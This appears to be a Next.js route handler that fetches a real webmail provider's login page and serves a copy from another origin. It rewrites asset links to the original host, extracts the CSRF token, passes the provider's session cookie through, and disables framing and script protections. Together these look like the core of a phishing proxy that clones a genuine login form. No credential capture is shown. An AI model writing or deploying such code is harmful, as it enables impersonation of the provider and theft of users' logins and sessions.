import { NextRequest } from "next/server";

export const runtime = "nodejs";

export async function GET(request: NextRequest) {
  console.log("Fetching real HTML from webmail de facto...");
  
  try {
    // 1. Fetch the actual login page WITH credentials mode
    const response = await fetch("https://webmail.mwt.net/?_task=login", {
      headers: {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        // Important: Accept cookies from the target domain
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
      },
      // This ensures we get cookies if they are set
      redirect: "follow",
    });

    if (!response.ok) {
      return new Response(`Failed to fetch login page: ${response.status}`, {
        status: 500,
        headers: { "Content-Type": "text/plain" }
      });
    }

    let html = await response.text();

    // 2. FIX ASSETS: Direct replacement for known relative paths
    html = html.replace(/src="logos\//g, 'src="https://webmail.mwt.net/logos/');
    html = html.replace(
      /href="\/(?!https?:\/\/)/g,
      'href="https://webmail.mwt.net/',
    );
    html = html.replace(
      /src="\/(?!https?:\/\/)/g,
      'src="https://webmail.mwt.net/',
    );

    // 3. Extract the CSRF Token
    const tokenMatch = html.match(/name="_token"[^>]*value="([^"]+)"/);
    const token = tokenMatch ? tokenMatch[1] : null;
    console.log("Token found:", token);

    if (!token) {
      console.error("Could not find _token in HTML");
      return new Response("Token extraction failed", { 
        status: 500,
        headers: { "Content-Type": "text/plain" }
      });
    }

    // 4. Get the Set-Cookie header from the response
    const setCookieHeader = response.headers.get("set-cookie");
    console.log("Set-Cookie Header:", setCookieHeader);

    // 5. Return a RAW Response object with the cookie attached
    return new Response(html, {
      status: 200,
      headers: {
        "Content-Type": "text/html; charset=utf-8",
        "Content-Security-Policy": 
          "default-src *; script-src * 'unsafe-inline' 'unsafe-eval'; style-src * 'unsafe-inline'; img-src *;",
        "X-Frame-Options": "ALLOWALL",
        "Cache-Control": "no-cache",
        // Pass the cookie through so the client can use it
        ...(setCookieHeader ? { "Set-Cookie": setCookieHeader } : {})
      },
    });

  } catch (error) {
    console.error("Get Login Page Error:", error);
    return new Response("Server Error", { 
      status: 500,
      headers: { "Content-Type": "text/plain" }
    });
  }
}